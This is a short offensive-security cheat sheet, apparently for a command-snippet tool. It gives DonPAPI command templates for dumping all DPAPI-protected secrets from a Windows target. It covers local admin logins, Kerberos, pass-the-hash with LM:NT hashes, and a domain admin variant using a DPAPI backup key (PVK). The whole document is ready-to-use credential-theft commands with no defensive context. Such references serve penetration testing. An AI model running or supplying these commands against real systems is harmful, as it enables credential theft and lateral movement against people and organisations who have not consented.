# DonPAPI

% DonPAPI, dpapi

#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## DonPAPI - Dump all secrets of the target machine with Local Admin
```
DonPAPI -local_auth <user>@<target>
```

## DonPAPI - Dump all secrets of the target machine with Local Admin (kerberos)
```
DonPAPI -k <domain>/<user>@<target>
```

## DonPAPI - Dump all secrets of the target machine with Local Admin (pth)
```
DonPAPI --hashes <LM>:<NT> <domain>/<user>@<target>
```


## DonPAPI - Dump all secrets with Domain Admin and PVK (pth)
run dpapi.py to get PVK
```
DonPAPI -pvk <pvk_path> -o <out_path> --hashes <LM>:<NT> <domain>/<user>@<target>
```